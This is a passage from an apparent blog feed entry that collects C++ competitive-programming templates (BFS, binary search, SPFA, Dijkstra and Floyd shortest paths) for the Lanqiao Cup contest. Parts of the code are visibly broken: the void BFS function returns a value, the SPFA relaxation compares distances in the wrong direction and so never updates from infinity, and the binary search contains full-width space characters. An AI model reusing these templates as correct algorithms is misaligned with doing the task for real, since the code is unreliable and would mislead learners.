false;if(vis[xx][yy]==true||matrix[xx][yy]==0)//下一个点走过或者为墙 0不能走，1能走return false;return true;}void BFS(int x, int y){queue&lt;node&gt; q;Node.x=x;Node.y=y;q.push(Node);//将起点入队列while(!q.empty())//队列不空就扩散{top=q.front();//取出队首元素int nx=top.x;int ny=top.y;//从四个方面机进行扩散         if(nx == ex &amp;&amp; ny == ey) //找到终点             return top;for(int i=0; i&lt;4; i++){if(judge(nx+X[i], ny+Y[i])) //检查四个方向，如果有路就进队列{Node.x=nx+X[i];Node.y=ny+Y[i];q.push(Node);}}ans++;//计数器vis[nx][ny]=true;q.pop();//表示这个点的邻接点已经全部入队列，丢弃这个点}}</code></pre><h3 id="7-二分模板"><a href="#7-二分模板" class="headerlink" title="7-二分模板"></a>7.二分模板</h3><pre><code class="language-c++">/*    作者:FengBOOOOOOOOOOOOOOO    二分模板返回大于x的第一个位置    */#include&lt;cstdio&gt;#include&lt;algorithm&gt;#include&lt;cstring&gt;#define N 1005using namespace std;int a[N],n,q;int find(int l,int r,int key)//l为-1，r为数组长度{    while(l + 1 &lt; r)    {        int mid = l + r&gt;&gt;1;        if(a[mid] &lt;= key)        　　l = mid;        else        　　r = mid;    }    return r;//返回大于Key的第一个位置}int main(){    int k;    scanf("%d%d",&amp;n,&amp;q);    for(int i = 0; i &lt; n; ++i)    　　scanf("%d",&amp;a[i]);    for(int i = 0; i &lt; q; ++i)    {        scanf("%d",&amp;k);        printf("%d\n",find(-1,n,k));    }} </code></pre><h2 id="最短路径问题"><a href="#最短路径问题" class="headerlink" title="最短路径问题"></a>最短路径问题</h2><h3 id="1-SPFA最短路径-类似与BFS"><a href="#1-SPFA最短路径-类似与BFS" class="headerlink" title="1-SPFA最短路径-类似与BFS"></a>1.SPFA最短路径(类似与BFS)</h3><pre><code class="language-c++">#include &lt;iostream&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;algorithm&gt;#include &lt;queue&gt;#include &lt;vector&gt;#define ll long long#define inf 0x3f3f3f3f#define pii pair&lt;int, int&gt;const int mod = 1e9+7;const int maxn = 2e5+7;using namespace std;struct node {int to,w,next;} edge[maxn];int head[maxn], cnt;int dis[maxn], vis[maxn];int n, m, s, t;struct Spfa{    void init()    {        memset(head,-1,sizeof(head));        memset(dis,0x3f3f3f3f,sizeof(dis));        memset(vis,0,sizeof(vis));        cnt = 0;    }     void add(int u,int v,int w)    {        edge[cnt].to = v;        edge[cnt].w = w;        edge[cnt].next = head[u];        head[u] = cnt ++;    }     void spfa()    {        dis[s] = 0; vis[s] = 1;        queue &lt;int&gt; Q; Q.push(s);        while(!Q.empty())        {            int now = Q.front();            Q.pop(); vis[now] = 0;    //从队列中弹出now , vis[now] 标记为未访问            for(int i = head[now]; i != -1; i = edge[i].next)            {                int v = edge[i].to;                if(dis[v] &lt; dis[now] + edge[i].w)                {                    dis[v] = dis[now] + edge[i].w;                    if(vis[v]) continue;    //如果访问过了(也就是 已经在队列中),就不用再push                    vis[v] = 1; Q.push(v);                }            }        }    }}sp; int main(){    while(~scanf("%d%d",&amp;n,&amp;m) &amp;&amp; n+m)    {        sp.init();        for(int i = 0; i &lt; m; i++)        {            int u, v, w;            scanf("%d%d%d",&amp;u, &amp;v, &amp;w);            sp.add(u, v, w);            sp.add(v, u, w);        }        s = 1, t = n; //s起点，t终点        sp.spfa();        printf("%d\n", dis[t]);    }}</code></pre><h3 id="2-Dijkstra"><a href="#2-Dijkstra" class="headerlink" title="2-Dijkstra"></a>2.Dijkstra</h3><pre><code class="language-c++">//主要思想一个大循环+两个小循环void dijkstra(){int u, minx;book[S] = 1;for(int i = 0; i &lt; N; i++){//dist[]数组初始化，把起始结点S到i结点的距离赋值给diat[i]dist[i] = v[S][i];}for(int i = 0; i &lt; N; i++){//大循环minx = INT_MAX;for(int j = 0; j &lt; N; j++){//寻找没有被标记并且最短的路径，并记录此结点 if(!book[j] &amp;&amp; minx &gt; dist[j]){minx = dist[j];u = j;} }book[u] = 1;for(int k = 0; k &lt; N; k++){//如果A到B的距离大于A到C的距离加C到B的距离，那么更新数据if(!book[k] &amp;&amp; dist[k] &gt; dist[u]+v[u][k]){dist[k] = dist[u]+v[u][k];}}}}</code></pre><h3 id="3-Floyd"><a href="#3-Floyd" class="headerlink" title="3-Floyd"></a>3.Floyd</h3><pre><code class="language-c++">//初始化：    for (int i = 1; i &lt;= n; i ++ )        for (int j = 1; j &lt;= n; j ++ )            if (i == j) d[i][j] = 0;            else d[i][j] = INF;// 算法结束后，d[a][b]表示a到b的最短距离void floyd(){    for (int k = 1; k &lt;= n; k ++ )        for (int i = 1; i &lt;= n; i ++ )            for (int j = 1; j &lt;= n; j ++ )                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;h1&gt;救赎&lt;/h1&gt;
&lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础</summary>
      
    
    
    
    
    <category term="蓝桥杯刷题总结" scheme="https://kylinxin.github.io/tags/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
</feed>
